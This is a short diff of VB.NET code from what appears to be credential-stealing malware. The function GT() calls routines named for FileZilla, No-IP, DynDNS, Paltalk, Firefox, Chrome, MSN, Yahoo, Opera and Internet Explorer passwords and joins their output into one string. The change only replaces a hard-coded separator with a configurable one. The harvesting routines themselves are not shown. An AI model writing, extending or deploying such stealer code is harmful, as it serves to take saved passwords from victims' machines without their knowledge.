@@ -10,23 +10,23 @@ Public Class A
     Public Shared Function GT() As String
         OL = ""
         FileZilla()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         NoIP()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         DynDNS()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         Paltalk()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         FireFox()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         Chrome.Gchrome()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         Msn()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         Yahoo()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         GetOpera()
-        OL += "|^^|"
+        OL += Main.n.splitalt
         Dim r = New CIE7Passwords
         r.Refresh()
         Return OL
